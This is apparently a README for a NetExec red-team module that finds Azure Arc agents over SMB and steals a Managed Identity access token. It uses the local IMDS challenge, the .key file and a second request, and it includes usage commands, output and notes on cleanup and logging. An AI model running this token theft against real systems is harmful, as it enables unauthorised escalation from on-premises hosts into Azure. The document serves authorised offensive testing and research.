# NetExec Module: `azurearc`

Enumerates Azure Arc presence on Windows targets and, when present, retrieves a **Managed Identity access token** from the local Arc IMDS endpoint using the documented **401 challenge → `.key` file → second request** flow.

- **Protocol:** SMB (requires local administrator privileges)
- **Primary use case:** Rapidly map Arc deployment and obtain a cloud-scoped token for Azure control-plane enumeration during red team engagements.

---

## ✨ Features

- **Presence check** (`CHECK=true`): Detects Arc agent by listing well-known install paths.
- **Token retrieval** (default): Executes the IMDS challenge/response locally on the target and returns JSON containing `access_token`.

---

## ⚙️ Usage

```bash
# Presence check only :
nxc smb <TARGET> -u <USER> -p '<PASS>' -M azurearc -o CHECK=true

# Token dump :
nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc
[*] Attempting to retrieve Azure Arc Managed Identity access token
[+] Managed Identity token retrieved
{
  "access_token": "eyJhbGciOi...<redacted>...",
  "expires_on": "1730812345",
  "token_type": "Bearer",
  "resource": "https://management.azure.com"
}


🔍 How It Works (Behavior)
Presence check via SMB listing:
C:\Program Files\AzureConnectedMachineAgent\*
C:\Program Files (x86)\AzureConnectedMachineAgent\*

Token retrieval on target (PowerShell):
1.GET http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=...
→ expect 401 with WWW-Authenticate: Basic realm="<path to .key>"
Read the .key contents (requires local admin).
2.Second GET with Authorization: Basic <key> to obtain token JSON.
Write JSON to OUTFILE, fetch via SMB, and delete the file.

```

📸 Screenshots
<img width="1201" height="450" alt="2025-10-05_16h20_40" src="https://github.com/user-attachments/assets/41ae5d89-0756-44dd-a0a5-7d936d3879c2" />
<img width="1189" height="391" alt="2025-10-05_17h29_40" src="https://github.com/user-attachments/assets/1b362d70-aace-4c94-bcbf-beb7e0679d3d" />

```bash

🔒 OPSEC & Scope Notes
Local admin required on the target (matches Arc’s security boundary).
Tokens are written to a temp file on the target only long enough to read back via SMB. the file is then deleted.
Be mindful of token lifetime and endpoint logging.


🧭 References
NSIDE Attack Logic  Azure Arc - Part 1 - Escalation from On-Premises to Cloud
https://www.nsideattacklogic.de/azure-arc-part-1-escalation-from-on-premises-to-cloud/
```
